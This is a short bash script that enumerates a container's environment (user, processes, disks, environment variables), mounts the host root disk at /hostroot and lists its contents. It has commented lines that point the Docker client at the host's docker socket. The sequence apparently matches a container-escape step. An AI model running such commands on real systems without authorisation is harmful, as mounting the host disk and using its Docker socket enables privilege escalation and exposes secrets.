#!/bin/bash
set -x
set -m
whoami
ls -alh /
ps aux
df -h
env
mkdir -p /hostroot
mount /dev/nvme0n1p1 /hostroot
ls -alh /hostroot
ls -alh /hostroot/var
ls -alh /hostroot/var/run/
#export DOCKER_HOST=unix:///hostroot/var/run/docker.sock
#docker ps  --all
